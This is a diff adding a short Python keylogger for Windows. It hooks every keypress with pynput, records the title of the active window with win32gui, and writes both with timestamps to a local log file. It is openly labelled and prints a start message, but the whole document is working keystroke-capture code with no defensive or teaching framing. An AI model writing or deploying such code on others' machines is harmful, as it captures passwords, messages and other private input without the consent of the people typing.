@@ -1,0 +1,41 @@
+from pynput import keyboard
+import logging
+import os
+import win32gui
+
+# === Setup log file ===
+log_folder = "keylogs"
+os.makedirs(log_folder, exist_ok=True)
+log_file = os.path.join(log_folder, "log.txt")
+
+logging.basicConfig(
+    filename=log_file,
+    level=logging.DEBUG,
+    format="%(asctime)s - %(message)s"
+)
+
+last_window = None
+
+def get_active_window():
+    try:
+        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+    except:
+        return "Unknown Window"
+
+def on_press(key):
+    global last_window
+    current_window = get_active_window()
+
+    if current_window != last_window:
+        last_window = current_window
+        logging.info(f"\n--- Active Window: {current_window} ---")
+
+    try:
+        logging.info(f"Key: {key.char}")
+    except AttributeError:
+        logging.info(f"Special Key: {key}")
+
+print("Keylogger started. Press Ctrl+C to stop.")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
